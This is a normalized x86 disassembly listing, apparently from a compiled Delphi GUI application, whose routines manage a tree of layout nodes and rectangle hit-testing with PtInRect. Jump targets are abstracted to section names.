call sub_3ab9fa8
jmp r-xdata
retn
sub_3ab9f60
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_3aba02c
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov edx 0x2
call sub_3aba02c
jmp r-xdata
retn
sub_3ab9fa8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp ebx [ eax + 0x64 ]
jne r-xdata
mov eax edi
mov ebp [ ebx + 0x14 ]
cmp al [ ebp + 0x10 ]
jne r-xdata
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
dec al
je r-xdata
mov ebx ebp
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_3aba400
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
sub_3aba02c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ebp [ esp + 0x8 ]
sub ebp [ esp ]
jmp r-xdata
mov ebp [ esp + 0xc ]
sub ebp [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_3ab9ebc
dec eax
jne r-xdata
mov eax edi
mov edx [ esi + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi [ esi + 0x14 ]
mov eax esi
call sub_3aba400
mov ebp eax
mov eax esi
call sub_3ab9f18
sub ebp eax
jmp r-xdata
mov eax edx
call sub_3aba400
mov ebp eax
mov ebp [ eax + 0x68 ]
jmp r-xdata
sub_3aba0e4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_3ab9ebc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_3aba504
mov ebx eax
movzx eax [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_3aba02c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_3ab9ebc
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_3aba02c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_3ab9f18
mov edx eax
add edx esi
mov eax ebx
call sub_3aba428
mov edx edi
mov eax ebx
call sub_3aba428
jmp r-xdata
mov eax ebx
call sub_3aba284
mov eax ebx
call sub_3aba4dc
mov ebx eax
test ebx ebx
jne r-xdata
sub_3aba18c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a652a0
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_3a652f4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
sub_3aba1d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb7
call sub_3a6457c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_3aba241
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_3ab09c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_3aba254
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_3aba4dc
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_3aba284
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
mov [ eax + 0x90 ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_3aba02c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3aba02c
mov esi eax
push ebp
call sub_3aba254
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aba4dc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9fa8
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_3ab9fa8
mov ecx ebx
pop edx
call sub_3a78e44
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3aaf4c0
mov eax [ ebp - 0x4 ]
call sub_3aba400
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_3aba400
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_3aba400
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_3aba400
push ebx
mov ebx eax
mov eax ebx
call sub_3ab9ee0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_3ab9e60
test al al
je r-xdata
mov eax ebx
call sub_3ab9f18
pop ebx
retn
sub_3aba43c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_3aba428
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab9ea8
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_3aba42c
mov esi eax
mov edx edi
mov eax esi
call sub_3aba43c
sub_3aba47c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aba400
mov edi eax
mov eax ebx
call sub_3ab9f18
cmp edi eax
jl r-xdata
mov eax esi
call sub_3aba0e4
mov edi [ esi + 0x1c ]
push edi
push sub_3abc2b8
mov edx esi
mov eax edi
call sub_3aba7bc
mov eax ebx
call sub_3aba400
mov edi eax
mov eax esi
call sub_3ab9f60
cmp edi eax
jle r-xdata
mov eax ebx
call sub_3aba47c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_3aba4e8
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_3ab9ee0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_3aba510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3a64350
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x80000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89978
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_3a90704
mov edx eax
mov eax ebx
call sub_3a89af4
mov eax [ ebp - 0x4 ]
call sub_3aba6e4
xor eax eax
push ebp
push sub_3aba61d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_3aba0e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aba624
mov eax [ ebp - 0x4 ]
call sub_3aba6e8
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_3ab3b68
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_3aba624
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_3abc2c8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aba678
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_3abb90c
mov eax [ esi + 0x10 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aba6fc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_3aba6fc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_3aba6fc
pop ecx
sub_3aba754
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_3aba6fc
pop ecx
sub_3aba780
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_3aba780
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_3aba780
pop ecx
sub_3aba7d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_3aba754
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_3aba02c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_3aba02c
push eax
mov edx 0x1
mov eax ebx
call sub_3ab9fa8
push eax
mov edx 0x2
mov eax ebx
call sub_3ab9fa8
pop edx
pop ecx
call sub_3a78e44
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_3a63a44
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_3aba858
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_3aba284
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_3a78e44
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_3aaf4c0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_3aba754
mov [ ebp - 0x8 ] eax
movzx eax [ ebp - 0x1 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_3ab9ea8
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_3abb9a8
mov edx esi
mov eax ebx
call sub_3aba754
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_3aafb28
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
movzx eax [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_3aafb14
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
movzx edx [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_3aba02c
mov edx eax
mov eax edi
call sub_3aba428
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_3aba02c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_3aba02c
mov edx eax
mov eax edi
call sub_3aba428
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_3aba02c
mov [ ebx + 0x68 ] eax
jmp r-xdata
movzx edx [ ebp - 0x9 ]
push edx
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_3abaa74
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_3abac1c
jmp r-xdata
sub_3abaa74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ab9e84
mov ebx eax
movzx eax [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_3aba400
mov edx eax
mov eax ebx
call sub_3aba428
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_3aba428
mov eax [ esi + 0x64 ]
call sub_3aba400
mov [ esi + 0x68 ] eax
movzx eax [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_3abbd30
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_3aba7bc
mov eax [ esi + 0x64 ]
call sub_3aba400
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_3abbd30
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_3aba7bc
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_3abc180
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_3aba7bc
mov eax [ esi + 0x64 ]
call sub_3aba400
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_3abc2b8
xor edx edx
mov eax esi
call sub_3aba7bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_3aba428
adc edx 0x0
mov eax ebx
call sub_3aba0e4
mov eax ebx
call sub_3aba47c
push esi
push sub_3abc2b8
xor edx edx
mov eax esi
call sub_3aba7bc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_3abac1c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_3aba0e4
mov eax [ ebx + 0x14 ]
call sub_3aba47c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_3abac94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov edx 0x1
mov eax esi
call sub_3ab9fa8
mov edi eax
mov edx 0x2
mov eax esi
call sub_3ab9fa8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax esi
call sub_3aba02c
add edi eax
cmp edi [ ebx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax esi
call sub_3aba02c
add eax [ ebp - 0xc ]
cmp eax [ ebx ]
jl r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
cmp edx [ ebx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
sub_3abad98
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov ebp eax
mov eax [ ebp + 0x14 ]
call sub_3ab3ba4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
mov edx esi
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
mov ecx esp
call sub_3a78df4
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1da ] 0x0
je r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3abae24
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
